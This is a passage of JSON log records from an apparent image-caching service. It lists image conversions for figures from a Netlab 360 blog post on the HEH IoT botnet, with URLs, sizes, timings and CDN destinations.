KB","compressRate":"115.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/kill_serv_by_ports.png","sourceStatusCode":200,"destWidth":457,"destHeight":1029,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn63@2020_2/2020/10/09/16-44-24-891_1981d8cf274df658.webp","sourceBytes":56353,"destBytes":82892,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":7392,"convertSpendMs":54,"createdTime":"2020-10-10 00:44:18","host":"us-018*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx24","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"55 KB","destSize":"80.9 KB","compressRate":"147.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/bot_cmd_st.png","sourceStatusCode":200,"destWidth":1366,"destHeight":1586,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn40@2020_1/2020/10/09/16-44-25-401_1dc3b6853b9751c4.webp","sourceBytes":181741,"destBytes":305530,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":7968,"convertSpendMs":370,"createdTime":"2020-10-10 00:44:18","host":"us-027*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx1","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"177.5 KB","destSize":"298.4 KB","compressRate":"168.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/random_dip.png","sourceStatusCode":200,"destWidth":1590,"destHeight":1394,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn78@2020_2/2020/10/09/16-44-26-576_f89f0e713dce5e39.webp","sourceBytes":117532,"destBytes":122360,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":7088,"convertSpendMs":116,"createdTime":"2020-10-10 00:44:20","host":"us-035*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"114.8 KB","destSize":"119.5 KB","compressRate":"104.1%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/http_server.png","sourceStatusCode":200,"destWidth":2000,"destHeight":1053,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn72@2020_3/2020/10/09/16-44-27-727_fed2f2fa887b029c.webp","sourceBytes":1262353,"destBytes":196176,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":10651,"convertSpendMs":102,"createdTime":"2020-10-10 00:44:18","host":"europe69*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx12","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"1.2 MB","destSize":"191.6 KB","compressRate":"15.5%"},{"code":1,"isDone":false,"source":"https://blog.netlab.360.com/content/images/2020/09/start_http_serv.png","sourceStatusCode":200,"destWidth":876,"destHeight":780,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx6/cdn36@2020_6/2020/10/09/16-44-33-772_3195c428f7fb8f60.webp","sourceBytes":52298,"destBytes":71110,"targetWebpQuality":75,"feedId":45157,"totalSpendMs":3523,"convertSpendMs":34,"createdTime":"2020-10-10 00:44:31","host":"us-034*","referer":"https://blog.netlab.360.com/heh-an-iot-p2p-botnet-cn/","linkMd5ListStr":"4e5209dc889a2c56f65a465131cce3b8","githubUser":"myreaderx6","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"51.1 KB","destSize":"69.4 KB","compressRate":"136%"}],"successGithubMap":{"myreaderx25":1,"myreaderx7":1,"myreaderx16":1,"myreaderx6":1,"myreaderx21":1,"myreaderx10":1,"myreaderx4":1,"myreaderx12":1,"myreaderx2":1,"myreaderx1":1,"myreaderx24":1,"myreaderx5oss":1,"myreaderx29":1,"myreaderx":1},"failGithubMap":{}}